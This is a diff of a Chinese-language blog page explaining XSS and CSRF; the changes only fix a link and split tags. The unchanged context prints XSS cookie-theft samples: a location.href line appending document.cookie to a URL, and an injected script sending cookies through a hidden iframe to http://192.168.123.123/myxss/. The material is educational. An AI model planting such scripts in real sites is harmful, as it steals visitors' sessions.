@@ -212,7 +212,7 @@ var _hmt = _hmt || [];
 <p>攻击者看到伪造URL<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href = <span class="string">"http://a.com?"</span>+<span class="built_in">document</span>.cookie;获取用户cookie!</span><br></pre></td></tr></table></figure></p>
 <p>也就是说<strong>它利用了网站的某个漏洞，然后把脚本注入该网页</strong>，让其他登录的用户登录后就会把该用户的信息获取到并发送给一个恶意的服务器。把压缩后的url发给某个登录的用户</p>
 <h3 id="一个网页的评论有漏洞-没有转义"><a href="#一个网页的评论有漏洞-没有转义" class="headerlink" title="一个网页的评论有漏洞(没有转义)"></a>一个网页的评论有漏洞(没有转义)</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">window, document</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 构造泄露信息用的 URL</span></span><br><span class="line">    <span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie;</span><br><span class="line">    <span class="keyword">var</span> xssURIBase = <span class="string">"http://192.168.123.123/myxss/"</span>;</span><br><span class="line">    <span class="keyword">var</span> xssURI = xssURIBase + <span class="built_in">window</span>.encodeURI(cookies);</span><br><span class="line">    <span class="comment">// 建立隐藏 iframe 用于通讯</span></span><br><span class="line">    <span class="keyword">var</span> hideFrame = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">    hideFrame.height = <span class="number">0</span>;</span><br><span class="line">    hideFrame.width = <span class="number">0</span>;</span><br><span class="line">    hideFrame.style.display = <span class="string">"none"</span>;</span><br><span class="line">    hideFrame.src = xssURI;</span><br><span class="line">    <span class="comment">// 开工</span></span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(hideFrame);</span><br><span class="line">&#125;)(<span class="built_in">window</span>, <span class="built_in">document</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
-<p>那么这段代码就会被执行，这个代码会携带着登录用户的信息传输给<a href="http://192.168.123.123/myxss/服务器，然后服务器的代码就会接收了用户的隐式信息" target="_blank" rel="noopener">http://192.168.123.123/myxss/服务器，然后服务器的代码就会接收了用户的隐式信息</a>!<br>主要原理就是注入脚本到</p>
+<p>那么这段代码就会被执行，这个代码会携带着登录用户的信息传输给<a href="http://192.168.123.123/myxss/" target="_blank" rel="noopener">http://192.168.123.123/myxss/</a> 服务器，然后服务器的代码就会接收了用户的隐式信息!<br>主要原理就是注入脚本到</p>
 <h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2>
                                                     
 
@@ -226,7 +226,11 @@ var _hmt = _hmt || [];
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web安全 前端</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">web安全</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">前端</a>
         		</li>
       		
 		</ul>
@@ -433,7 +437,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">web安全 前端</a>
+                <a href="javascript:void(0)" class="js-tag color1">web安全</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">前端</a>
               </li>
             
             <div class="clearfix"></div>
